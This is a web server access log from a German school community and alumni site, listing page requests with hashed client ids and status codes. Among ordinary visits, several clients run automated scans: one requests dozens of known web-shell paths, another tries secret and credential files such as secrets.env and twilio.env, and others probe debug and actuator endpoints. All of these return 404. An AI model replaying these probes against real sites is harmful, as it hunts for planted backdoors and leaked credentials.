8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:07;;/gruppen/hobby/biologie;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:10;;/gruppen/hobby/gartnern;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:14;;/gruppen/hobby/skulptur;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:18;;/themen?category=bildung;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:22;;/themen?category=politik;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:25;;/gruppen/hobby/geometrie;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:28;;/gruppen/hobby/statistik;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:32;;/gruppen/hobby/astronomie;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:36;;/gruppen/hobby/fotografie;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:39;;/gruppen/hobby/geschichte;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:42;;/gruppen/hobby/podcasting;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:46;;/gruppen/hobby/debattieren;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:50;;/gruppen/hobby/logikspiele;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:54;;/gruppen/hobby/philosophie;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:26:59;;/gruppen/hobby/diy-projekte;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:05;;/gruppen/hobby/grafikdesign;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:08;;/gruppen/hobby/journalismus;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:12;;/gruppen/hobby/abschlussfest;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:15;;/gruppen/hobby/finanzbildung;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:20;;/gruppen/hobby/fremdsprachen;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:24;;/gruppen/hobby/programmieren;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:27;;/gruppen/hobby/teamsportarten;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:31;;/gruppen/interesse/teamarbeit;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:35;;/gruppen/hobby/fotobearbeitung;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:38;;/gruppen/hobby/musikproduktion;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:42;;/gruppen/hobby/einzelsportarten;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:45;;/gruppen/hobby/literaturanalyse;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:50;;/gruppen/hobby/vogelbeobachtung;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:53;;/gruppen/hobby/elektronikbasteln;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:27:56;;/gruppen/hobby/kochen-und-backen;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:00;;/gruppen/hobby/kulturelle-studien;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:04;;/gruppen/hobby/malen-und-zeichnen;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:09;;/gruppen/hobby/kreatives-schreiben;GET;302
eb397faf7473a19db2e6084b524d7ee85c0aafac01d841195e1bed81391d140b;2025-11-10 21:28:11;;/;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:13;;/gruppen/hobby/yoga-und-meditation;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:18;;/gruppen/hobby/politik-und-debatten;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:21;;/gruppen/hobby/schreinern-und-bauen;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:25;;/gruppen/hobby/sozialwissenschaften;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:29;;/gruppen/interesse/entrepreneurship;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:33;;/personen/alumni/details/tobi-esche;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:36;;/themen/details/david-gegen-goliath;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:41;;/gruppen/interesse/projektmanagement;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:44;;/gruppen/interesse/selbststandigkeit;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:47;;/gruppen/hobby/ernahrungswissenschaft;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:52;;/gruppen/hobby/mathematik-wettbewerbe;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:28:57;;/gruppen/hobby/theater-und-schauspiel;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:01;;/aktuelles/meldungen?category=community;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:04;;/gruppen/hobby/social-media-management;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:08;;/personen/alumni/details/felix-fischer;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:13;;/personen/alumni/details/sophia-gawron;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:16;;/gruppen/hobby/film-und-videoproduktion;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:20;;/gruppen/hobby/musikinstrumente-spielen;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:25;;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:28;;/gruppen/interesse/recht-und-verwaltung;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:31;;/gruppen/interesse/strategische-planung;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:36;;/personen/alumni/details/heidi-burghard;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:40;;/personen/alumni/details/sidney-dittrich;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:46;;/aktuelles/meldungen?category=wissenschaft;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:50;;/themen/details/was-kommt-nach-dem-abitur;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:53;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:29:56;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:01;;/gruppen/interesse/kommunikationsfahigkeiten;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:04;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:07;;/gruppen/interesse/it-und-softwareentwicklung;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:11;;/gruppen/interesse/weiterbildung-und-training;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:16;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:19;;/gruppen/interesse/gesundheitswesen-und-pflege;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:24;;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:28;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:32;;/veranstaltungen/details/wartende-das-theaterstuck;GET;200
8bc8b3fbab49f686f8fdbae5e5c497a76fbc66a4ce1cace62bdf3f6d1f4fa94c;2025-11-10 21:30:35;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
a96e0f999ed5e54e665903efe68c9d3356f21652c1524e158f9e2008f90c3b88;2025-11-10 21:41:55;;/;GET;200
f2c3f020a82e07e87aef3838505fe9e1f8bb3e6acd91175de37b9a6d0323c2ae;2025-11-10 21:42:04;;/;GET;200
4ab332072e83bfa3f959a6b690174f64f7d0f96bda5a8052f17d35f824a0fc83;2025-11-10 21:42:39;;/;GET;200
1d55b9ac1d3cbf792bfa386b5bb0117f770808f77b8e5a1e26005330f4cd21a3;2025-11-10 21:44:30;;/;GET;200
503c72bd11311ccf2f85d09a1a41ef48b738fb8ed47609b92e21dcd2dc10b68e;2025-11-10 21:45:27;;/?page=docs-MA1-matrix.md;GET;200
786bb84a8753c75134549fdcdd43024f239b7ebd271a99742b9d65b21923d984;2025-11-10 21:45:29;;/?page=docs-MA1-elemfunc.md;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-10 21:58:46;/gruppen/interesse/kundenbetreuung-und-beratung;/personen/alumni/schule/07A05;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-10 22:00:08;/personen/all/5;/personen/all/3;GET;200
0b097cf7a1dbdb54636be3a4148cd81096aeeb53a483406058d7d94d3c23f954;2025-11-10 22:14:21;;/login;GET;200
d8650be839fbaa7f0cb75870de8a3ceedb7b0e508846dd648ea4484d6b781d6d;2025-11-10 22:15:21;/;/;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-10 22:17:11;/;/;GET;200
af8202ec8a5a8ff1a9d5d2905c5341b1cec7ad724ccc4027b4870ab657b5837d;2025-11-10 22:20:18;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-10 22:24:23;/gruppen/interesse/kundenbetreuung-und-beratung;/personen/alumni/schule/MP004;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-10 22:25:44;/gruppen/hobby/reisen;/personen/alumni/details/sidney-dittrich;GET;200
eb9f0908617d01f30c4eb63472106536c4c73ceb0686268e8ca80a6b0ae4daa7;2025-11-10 22:29:07;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-10 22:36:36;;/?XDEBUG_SESSION_START=phpstorm;GET;200
c64ba3f71e974133b1ce73810d046d1e3cbba4bfe50e9a82d664d62e4a25b197;2025-11-10 22:39:12;;/;GET;200
840d3a2e6b737ec22925101f8fb28237adb7389434edc5af0143f723363aa734;2025-11-10 22:40:11;;/;GET;200
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:17;;/2.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:19;;/ALFA_DATA/alfacgiapi/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:20;;/a.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:20;;/aaa.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:21;;/ab.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:22;;/about.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:23;;/admin/upload/css.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:24;;/alfa.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:25;;/api.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:26;;/auth.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:27;;/bk/index.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:28;;/classwithtostring.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:29;;/contents.php/lv.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:30;;/css/index.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:31;;/default.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:32;;/en-us/2021/04/30/php-community-sidesteps-its-third-supply-chain-attack-in-three-years/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:33;;/en/wp-includes/ID3/index.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:34;;/favicon.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:35;;/hehe.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:36;;/include/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:37;;/feed/atom/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:38;;/info.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:39;;/k.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:40;;/lock360.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:40;;/log.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:42;;/man.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:43;;/modules/mod_footer/tmpl/index.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:43;;/post.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:45;;/private/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:45;;/root.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:46;;/shellv3.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:48;;/simple/function.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:49;;/system.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:50;;/test.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:50;;/theme.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:51;;/wp-activat.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:52;;/wp-admin.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:53;;/wp-admin/images/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:54;;/wp-admin/images/admin.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:55;;/wp-admin/includes/moon.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:56;;/wp-admin/maint/edit.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:57;;/wp-blog.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:58;;/wp-conf.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:58;;/wp-content/1.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:44:59;;/wp-content/plugins/WordPressCore/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:01;;/wp-content/plugins/ioxi/ioxi/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:01;;/wp-content/themes/404.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:02;;/wp-content/uploads/2018/03/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:03;;/wp-content/uploads/2022/07/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:04;;/wp-content/uploads/2023/03/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:05;;/wp-content/uploads/autoload_classmap.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:06;;/wp-content/uploads/wp.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:07;;/wp-file.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:08;;/wp-include.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:08;;/wp-includes/Requests/library/index.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:09;;/wp-includes/blocks/group/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:10;;/wp-includes/blocks/post-author/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:11;;/wp-includes/css/index.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:12;;/wp-includes/header.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:13;;/wp-includes/js/tinymce/skins/lightgray/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:14;;/wp-includes/js/tinymce/themes/inlite/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:14;;/wp-includes/mani.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:15;;/wp-includes/sodium_compat/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:16;;/wp-includes/theme-compat/;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:17;;/wp-logs.php;GET;404
ebbcb7162e23a5f36d4d44428a31f2ce2f2f46e67e8735004003e32a5ea0d023;2025-11-10 22:45:18;;/xmlrpc.php;GET;404
eb4384ef7bc86e2ea34bb932cbd83e75cb04ae82375a899d76993379d67852ad;2025-11-10 22:47:47;;/;GET;200
ec2befb6cafb13d0ec1a4962f877fa9f690633637d682b5f4d69b294886fe21c;2025-11-10 22:53:47;;/;GET;200
978405201f1b90726f926558d757b8b86cc3c65963768f8c7cca28febd0c4dd2;2025-11-10 23:00:07;;/;GET;200
a6efb9232836cd22d58cc994c381334a80e45801cf9e7d0edad6400ba9a97b05;2025-11-10 23:04:39;;/?p=admin/dashboard;GET;200
a6efb9232836cd22d58cc994c381334a80e45801cf9e7d0edad6400ba9a97b05;2025-11-10 23:04:39;;/;GET;200
447934ce3f2be7d30d0c2253e6284ff80c170b53b0835e97c452d065164feb42;2025-11-10 23:19:25;;/;GET;200
a8f2c145316b032bfdab21a0f208d2cc6fd3d6f7c4d15498fa00934df568504a;2025-11-10 23:26:17;;/tr/;GET;404
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-10 23:27:44;;/;GET;200
b95749702cbbd2d88c3e7cfb22b4f34e99d44b4edd8e8f96808b4e0994a5fab9;2025-11-10 23:32:03;;/;GET;200
71d0ae922227ab7495d05a158951bf17fb9594ee71fdadffbfc5d61fcde7251c;2025-11-10 23:38:48;;/gruppen/interesse/teamarbeit;GET;200
8c1044df90448a4f1324f7c2170920c118528aa827b32f692174ec951b13a72d;2025-11-10 23:38:50;;/sitemap.xml;GET;200
1701c7c2d989788db73dd9c384cb3b095a60219239cdfec50703647568ebf4d2;2025-11-10 23:39:45;;/;GET;200
14f8a6299974faf744549f90a2eed0defb492ba0410f3aa7990c8577cd1ae03f;2025-11-10 23:45:11;;/;GET;200
15d5b62a4898a98a876e67ef1cd2f82b712d8cdff93f7bf8965b7d998dd5f717;2025-11-11 00:07:37;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-11 00:13:16;;/actuator/gateway/routes;GET;404
c15b3c24285122ad9ee6c7720d0be13acf60fc80124d5a1b376fac5aa337810e;2025-11-11 00:18:27;;/;GET;200
bcf69f2e0004c9576d2d4d6a41d5856f8785317338a1ae657f21faf110b32d00;2025-11-11 00:18:32;/;/;GET;200
5b491802659273ae887eefe9b3f7b4d01535da88fdde7286e5de0bb059feeb66;2025-11-11 00:58:08;;/;GET;200
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:12;;/;GET;200
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:12;;/;GET;200
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:18;;/sendgrid.env;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:20;;/sendgrid.env;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:22;;/twilio.env;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:25;;/twilio.env;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:28;;/phpinfo/;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:31;;/phpinfo/;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:34;;/app_dev.php/_profiler/phpinfo;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:39;;/app_dev.php/_profiler/phpinfo;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:40;;/.config.yaml;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:49;;/secrets.env;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:00:58;;/.config.yaml;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-11 01:01:01;;/secrets.env;GET;404
